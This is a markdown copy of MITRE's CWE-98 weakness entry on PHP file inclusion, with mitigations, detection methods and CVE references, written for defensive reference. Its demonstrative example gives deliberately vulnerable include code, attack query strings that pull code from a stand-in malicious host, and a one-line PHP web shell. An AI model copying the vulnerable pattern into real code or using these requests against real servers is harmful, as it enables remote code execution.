---
secid: "secid:weakness/mitre.org/cwe@4.21#CWE-98"
cwe_id: "CWE-98"
entry_type: weakness
name: "Improper Control of Filename for Include/Require Statement in PHP Program"
abstraction: Variant
structure: Simple
status: Draft
mapping_usage: Allowed
cwe_version: "4.21"
cwe_release_date: "2026-10-28"
upstream: "https://cwe.mitre.org/data/definitions/98.html"
---

# CWE-98: Improper Control of Filename for Include/Require Statement in PHP Program

## Description

The PHP application receives input from an upstream component, but it does not restrict or incorrectly restricts the input before its usage in "require," "include," or similar functions. (Roles: Common-Name, Acronym, Common-Name, Common-Name)

## Alternate Terms

- **Remote file include**
- **RFI**: The Remote File Inclusion (RFI) acronym is often used by vulnerability researchers.
- **Local file inclusion**: This term is frequently used in cases in which remote download is disabled, or when the first part of the filename is not under the attacker's control, which forces use of relative path traversal (CWE-23) attack techniques to access files that may contain previously-injected PHP code, such as web access logs.
- **PHP Remote File Inclusion**

## Related Weaknesses

| Nature | Entry | View | Ordinal |
| --- | --- | --- | --- |
| ChildOf | [CWE-706](../weaknesses/CWE-706.md) Use of Incorrectly-Resolved Name or Reference (Class) | [CWE-1000](../views/CWE-1000.md) |  |
| ChildOf | [CWE-829](../weaknesses/CWE-829.md) Inclusion of Functionality from Untrusted Control Sphere (Base) | [CWE-1000](../views/CWE-1000.md) | Primary |
| CanPrecede | [CWE-94](../weaknesses/CWE-94.md) Improper Control of Generation of Code (Base) | [CWE-1000](../views/CWE-1000.md) |  |
| CanAlsoBe | [CWE-426](../weaknesses/CWE-426.md) Untrusted Search Path (Base) | [CWE-1000](../views/CWE-1000.md) |  |

## Weakness Ordinalities

- **Primary**

## Applicable Platforms

| Type | Name | Class | Prevalence |
| --- | --- | --- | --- |
| Language | PHP |  | Often |
| Technology |  | Web Based | Undetermined |
| Technology | Web Server |  | Undetermined |

## Modes Of Introduction

- **Implementation**: REALIZATION: This weakness is caused during implementation of an architectural security tactic.

## Likelihood Of Exploit

High

## Common Consequences

| Scope | Impact | Note |
| --- | --- | --- |
| Integrity<br>Confidentiality<br>Availability | Execute Unauthorized Code or Commands | In certain versions and configurations of PHP with the allow_url_include setting enabled, an attacker could specify a URL to a remote location from which the product will obtain the code to execute. In other cases in association with path traversal, the attacker can specify a local file that may contain executable statements that can be parsed by PHP. In some cases, the attacker might be able to insert PHP specifiers into a data file, then cause that data file to be included, causing it to be parsed by PHP. |

## Detection Methods

- **Method:** Manual Analysis

  Manual white-box analysis can be very effective for finding this issue, since there is typically a relatively small number of include or require statements in each program.

  **Effectiveness:** High

- **Method:** Automated Static Analysis

  The external control or influence of filenames can often be detected using automated static analysis that models data flow within the product.

  Automated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or require any code changes. If the program uses a customized input validation library, then some tools may allow the analyst to create custom signatures to detect usage of those routines.

## Potential Mitigations

- **Phase:** Architecture and Design · **Strategy:** Libraries or Frameworks · **ID:** MIT-4

  Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid [REF-1482].

- **Phase:** Architecture and Design · **Strategy:** Enforcement by Conversion · **ID:** MIT-21.1

  When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.

  For example, ID 1 could map to "inbox.txt" and ID 2 could map to "profile.txt". Features such as the ESAPI AccessReferenceMap [REF-185] provide this capability.

- **Phase:** Architecture and Design · **ID:** MIT-15

  For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.

- **Phase:** Architecture and Design; Operation · **Strategy:** Sandbox or Jail · **ID:** MIT-22

  Run the code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.

  OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.

  This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.

  Be careful to avoid CWE-243 and other weaknesses related to jails.

  **Effectiveness:** Limited

  **Effectiveness Notes:** The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.

- **Phase:** Architecture and Design; Operation · **Strategy:** Environment Hardening · **ID:** MIT-17

  Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.

- **Phase:** Implementation · **Strategy:** Input Validation · **ID:** MIT-5.1

  Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.

  When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."

  Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.

  When validating filenames, use stringent lists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as "/" to avoid CWE-36. Use a list of allowable file extensions, which will help to avoid CWE-434.

  Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering "/" is insufficient protection if the filesystem also supports the use of "\\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if "../" sequences are removed from the ".../...//" string in a sequential fashion, two instances of "../" would be removed from the original string, but the remaining characters would still form the "../" string.

  **Effectiveness:** High

- **Phase:** Architecture and Design; Operation · **Strategy:** Attack Surface Reduction · **ID:** MIT-34

  Store library, include, and utility files outside of the web document root, if possible. Otherwise, store them in a separate directory and use the web server's access control capabilities to prevent attackers from directly requesting them. One common practice is to define a fixed constant in each calling program, then check for the existence of the constant in the library/include file; if the constant does not exist, then the file was directly requested, and it can exit immediately.

  This significantly reduces the chance of an attacker being able to bypass any protection mechanisms that are in the base program but not in the include files. It will also reduce the attack surface.

- **Phase:** Architecture and Design; Implementation · **Strategy:** Attack Surface Reduction · **ID:** MIT-6

  Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.

  Many file inclusion problems occur because the programmer assumed that certain inputs could not be modified, especially for cookies and URL components.

- **Phase:** Operation · **Strategy:** Firewall · **ID:** MIT-29

  Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth [REF-1481].

  **Effectiveness:** Moderate

  **Effectiveness Notes:** An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization.

- **Phase:** Operation; Implementation · **Strategy:** Environment Hardening

  Ensure that the allow_url_include setting is off. Refactor the code if necessary.

  **Effectiveness:** Moderate

  **Effectiveness Notes:** The allow_url_include setting only prevents remote file inclusion; it does not protect against local file inclusion.

- **Phase:** Operation; Implementation · **Strategy:** Environment Hardening

  Develop and run the code in the most recent versions of PHP available. Many of the highly risky features in earlier PHP interpreters have been removed, restricted, or disabled by default.

- **Phase:** Operation; Implementation · **Strategy:** Environment Hardening · **ID:** MIT-16

  When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.

  Often, programmers do not protect direct access to files intended only to be included by core programs. These include files may assume that critical variables have already been initialized by the calling program. As a result, the use of register_globals combined with the ability to directly access the include file may allow attackers to conduct file inclusion attacks. This remains an extremely common pattern as of 2009.

- **Phase:** Operation · **Strategy:** Environment Hardening

  Set allow_url_fopen to false, which limits the ability to include files from remote locations.

  **Effectiveness:** High

  **Effectiveness Notes:** Be aware that some versions of PHP will still accept ftp:// and other URI schemes. In addition, this setting does not protect the code from path traversal attacks (CWE-22), which are frequently successful against the same vulnerable code that allows remote file inclusion.

## Demonstrative Examples

### Example 1 (DX-229)

The following code, victim.php, attempts to include a function contained in a separate PHP page on the server. It builds the path to the file by using the supplied 'module_name' parameter and appending the string '/function.php' to it.

*Example (Bad, PHP):*

```php
$dir = $_GET['module_name'];
include($dir . "/function.php");
```

The problem with the above code is that the value of $dir is not restricted in any way, and a malicious user could manipulate the 'module_name' parameter to force inclusion of an unanticipated file. For example, an attacker could request the above PHP page (example.php) with a 'module_name' of "http://malicious.example.com" by using the following request string:

*Example (Attack):*

```
victim.php?module_name=http://malicious.example.com
```

Upon receiving this request, the code would set 'module_name' to the value "http://malicious.example.com" and would attempt to include http://malicious.example.com/function.php, along with any malicious code it contains.

For the sake of this example, assume that the malicious version of function.php looks like the following:

*Example (Bad, PHP):*

```php
system($_GET['cmd']);
```

An attacker could now go a step further in our example and provide a request string as follows:

*Example (Attack):*

```
victim.php?module_name=http://malicious.example.com&cmd=/bin/ls%20-l
```

The code will attempt to include the malicious function.php file from the remote site. In turn, this file executes the command specified in the 'cmd' parameter from the query string. The end result is an attempt by tvictim.php to execute the potentially malicious command, in this case:

*Example (Attack):*

```
/bin/ls -l
```

Note that the above PHP example can be mitigated by setting allow_url_fopen to false, although this will not fully protect the code. See potential mitigations.

## Observed Examples

| Reference | Description |
| --- | --- |
| [CVE-2004-0285](https://www.cve.org/CVERecord?id=CVE-2004-0285) | Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request. |
| [CVE-2004-0030](https://www.cve.org/CVERecord?id=CVE-2004-0030) | Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request. |
| [CVE-2004-0068](https://www.cve.org/CVERecord?id=CVE-2004-0068) | Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request. |
| [CVE-2005-2157](https://www.cve.org/CVERecord?id=CVE-2005-2157) | Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request. |
| [CVE-2005-2162](https://www.cve.org/CVERecord?id=CVE-2005-2162) | Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request. |
| [CVE-2005-2198](https://www.cve.org/CVERecord?id=CVE-2005-2198) | Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request. |
| [CVE-2004-0128](https://www.cve.org/CVERecord?id=CVE-2004-0128) | Modification of assumed-immutable variable in configuration script leads to file inclusion. |
| [CVE-2005-1864](https://www.cve.org/CVERecord?id=CVE-2005-1864) | PHP file inclusion. |
| [CVE-2005-1869](https://www.cve.org/CVERecord?id=CVE-2005-1869) | PHP file inclusion. |
| [CVE-2005-1870](https://www.cve.org/CVERecord?id=CVE-2005-1870) | PHP file inclusion. |
| [CVE-2005-2154](https://www.cve.org/CVERecord?id=CVE-2005-2154) | PHP local file inclusion. |
| [CVE-2002-1704](https://www.cve.org/CVERecord?id=CVE-2002-1704) | PHP remote file include. |
| [CVE-2002-1707](https://www.cve.org/CVERecord?id=CVE-2002-1707) | PHP remote file include. |
| [CVE-2005-1964](https://www.cve.org/CVERecord?id=CVE-2005-1964) | PHP remote file include. |
| [CVE-2005-1681](https://www.cve.org/CVERecord?id=CVE-2005-1681) | PHP remote file include. |
| [CVE-2005-2086](https://www.cve.org/CVERecord?id=CVE-2005-2086) | PHP remote file include. |
| [CVE-2004-0127](https://www.cve.org/CVERecord?id=CVE-2004-0127) | Directory traversal vulnerability in PHP include statement. |
| [CVE-2005-1971](https://www.cve.org/CVERecord?id=CVE-2005-1971) | Directory traversal vulnerability in PHP include statement. |
| [CVE-2005-3335](https://www.cve.org/CVERecord?id=CVE-2005-3335) | PHP file inclusion issue, both remote and local; local include uses ".." and "%00" characters as a manipulation, but many remote file inclusion issues probably have this vector. |
| [CVE-2009-1936](https://www.cve.org/CVERecord?id=CVE-2009-1936) | Chain: library file sends a redirect if it is directly requested but continues to execute, allowing remote file inclusion and path traversal. |

## Affected Resources

- File or Directory

## Taxonomy Mappings

| Taxonomy | Entry ID | Entry Name | Mapping Fit |
| --- | --- | --- | --- |
| PLOVER |  | PHP File Include |  |
| OWASP Top Ten 2007 | A3 | Malicious File Execution | CWE More Specific |
| WASC | 5 | Remote File Inclusion |  |

## Related Attack Patterns

- [CAPEC-193](https://capec.mitre.org/data/definitions/193.html)

## References

- [REF-185] OWASP. "Testing for Path Traversal (OWASP-AZ-001)". <http://www.owasp.org/index.php/Testing_for_Path_Traversal_(OWASP-AZ-001)>.
- [REF-76] Sean Barnum and Michael Gegick. "Least Privilege". 2005-09-14. <https://web.archive.org/web/20211209014121/https://www.cisa.gov/uscert/bsi/articles/knowledge/principles/least-privilege> (URL validated: 2023-04-07).
- [REF-951] Shaun Clowes. "A Study in Scarlet". <https://www.cgisecurity.com/lib/studyinscarlet.txt> (URL validated: 2025-07-29). Rationale: Early-Publication; Influential/Newsworthy.
- [REF-952] Stefan Esser. "Suhosin". <http://www.hardened-php.net/suhosin/>.
- [REF-953] Johannes Ullrich. "Top 25 Series - Rank 13 - PHP File Inclusion". SANS Software Security Institute. 2010-03-11. <https://www.sans.org/blog/top-25-series-rank-13-php-file-inclusion/> (URL validated: 2023-04-07).
- [REF-1481] D3FEND. "D3FEND: Application Layer Firewall". <https://d3fend.mitre.org/dao/artifact/d3f:ApplicationLayerFirewall/> (URL validated: 2025-09-06).
- [REF-1482] D3FEND. "D3FEND: D3-TL Trusted Library". <https://d3fend.mitre.org/technique/d3f:TrustedLibrary/> (URL validated: 2025-09-06).

## Mapping Notes

- **Usage:** Allowed
- **Rationale:** This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.
- **Comments:** Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.
- **Reasons:** Acceptable-Use

## Notes

- **Relationship**:

  This is frequently a functional consequence of other weaknesses. It is usually multi-factor with other factors (e.g. MAID), although not all inclusion bugs involve assumed-immutable data. Direct request weaknesses frequently play a role.

  Can overlap directory traversal in local inclusion problems.

- **Theoretical**:

  This entry has the following dimensions:

  - Behavior-Property: "Improper"
  - Behavior-Type: "Control"
  - Resource-Type: "Filename"
  - Code-Type: "Include/Require Statement"
  - Language-Type: "PHP"
  - Code-Type: "Program"
  - Common-Name: "PHP Remote File Inclusion""

## Content History

| Event | Date | Name | Organization | Release | Importance | Comment |
| --- | --- | --- | --- | --- | --- | --- |
| Submission | 2006-07-19 | PLOVER |  | CWE Draft 3, 2006-07-19 |  |  |
| Modification | 2008-07-01 | Eric Dalci | Cigital | CWE 1.0, 2008-09-09 |  | updated Time_of_Introduction |
| Modification | 2008-09-08 | CWE Content Team | MITRE | CWE 1.0, 2008-09-09 |  | updated Relationships, Relationship_Notes, Research_Gaps, Taxonomy_Mappings |
| Modification | 2009-01-12 | CWE Content Team | MITRE | CWE 1.2, 2009-01-12 |  | updated Relationships |
| Modification | 2009-03-10 | CWE Content Team | MITRE | CWE 1.3, 2009-03-10 |  | updated Relationships |
| Modification | 2009-05-27 | CWE Content Team | MITRE | CWE 1.4, 2009-05-27 |  | updated Description, Name |
| Modification | 2009-12-28 | CWE Content Team | MITRE | CWE 1.7, 2009-12-28 |  | updated Alternate_Terms, Applicable_Platforms, Demonstrative_Examples, Likelihood_of_Exploit, Potential_Mitigations, Time_of_Introduction |
| Modification | 2010-02-16 | CWE Content Team | MITRE | CWE 1.8, 2010-02-16 | Critical | converted from Compound_Element to Weakness |
| Modification | 2010-02-16 | CWE Content Team | MITRE | CWE 1.8, 2010-02-16 |  | updated Alternate_Terms, Common_Consequences, Detection_Factors, Potential_Mitigations, References, Related_Attack_Patterns, Relationships, Taxonomy_Mappings, Type |
| Modification | 2010-06-21 | CWE Content Team | MITRE | CWE 1.9, 2010-06-21 |  | updated Potential_Mitigations, References |
| Modification | 2010-09-27 | CWE Content Team | MITRE | CWE 1.10, 2010-09-27 |  | updated Potential_Mitigations |
| Modification | 2010-12-13 | CWE Content Team | MITRE | CWE 1.11, 2010-12-13 |  | updated Potential_Mitigations |
| Modification | 2011-06-27 | CWE Content Team | MITRE | CWE 2.0, 2011-06-27 |  | updated Relationships |
| Modification | 2012-10-30 | CWE Content Team | MITRE | CWE 2.3, 2012-10-30 |  | updated Potential_Mitigations, References |
| Modification | 2013-02-21 | CWE Content Team | MITRE | CWE 2.4, 2013-02-21 |  | updated Alternate_Terms, Name, Observed_Examples |
| Modification | 2017-01-19 | CWE Content Team | MITRE | CWE 2.10, 2017-01-19 |  | updated Relationships |
| Modification | 2017-11-08 | CWE Content Team | MITRE | CWE 3.0, 2017-11-08 |  | updated Affected_Resources, Demonstrative_Examples, Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships |
| Modification | 2019-06-20 | CWE Content Team | MITRE | CWE 3.3, 2019-06-20 |  | updated Type |
| Modification | 2020-02-24 | CWE Content Team | MITRE | CWE 4.0, 2020-02-24 |  | updated Potential_Mitigations, Relationships |
| Modification | 2020-06-25 | CWE Content Team | MITRE | CWE 4.1, 2020-06-25 |  | updated Potential_Mitigations |
| Modification | 2021-03-15 | CWE Content Team | MITRE | CWE 4.4, 2021-03-15 |  | updated Potential_Mitigations |
| Modification | 2021-10-28 | CWE Content Team | MITRE | CWE 4.6, 2021-10-28 |  | updated Relationships |
| Modification | 2022-04-28 | CWE Content Team | MITRE | CWE 4.7, 2022-04-28 |  | updated Research_Gaps |
| Modification | 2022-10-13 | CWE Content Team | MITRE | CWE 4.9, 2022-10-13 |  | updated References |
| Modification | 2023-01-31 | CWE Content Team | MITRE | CWE 4.10, 2023-01-31 |  | updated Description, Detection_Factors |
| Modification | 2023-04-27 | CWE Content Team | MITRE | CWE 4.11, 2023-04-27 |  | updated References, Relationships, Time_of_Introduction |
| Modification | 2023-06-29 | CWE Content Team | MITRE | CWE 4.12, 2023-06-29 |  | updated Mapping_Notes |
| Modification | 2025-04-03 | CWE Content Team | MITRE | CWE 4.17, 2025-04-03 |  | updated Demonstrative_Examples |
| Modification | 2025-09-09 | CWE Content Team | MITRE | CWE 4.18, 2025-09-09 |  | updated Potential_Mitigations, References |
| Modification | 2025-12-11 | CWE Content Team | MITRE | CWE 4.19, 2025-12-11 |  | updated Applicable_Platforms, Demonstrative_Examples, Relationships, Weakness_Ordinalities |

**Previous Entry Names:**

- PHP File Inclusion — 2008-04-11
- Insufficient Control of Filename for Include/Require Statement in PHP Program (aka 'PHP File Inclusion') — 2009-05-27
- Improper Control of Filename for Include/Require Statement in PHP Program ('PHP File Inclusion') — 2013-02-21

---
Generated from MITRE's CWE 4.21 XML (cwec_v4.21.xml) by weakness/mitre.org/cwe/scripts/cwe_to_markdown.py.
Copyright © The MITRE Corporation. CWE™ is a trademark of The MITRE Corporation.
Used under the CWE Terms of Use: https://cwe.mitre.org/about/termsofuse.html (full text: https://github.com/CloudSecurityAlliance-DataSets/dataset-public-laws-regulations-standards/blob/main/weakness/mitre.org/cwe/4.21/LICENSE.txt).
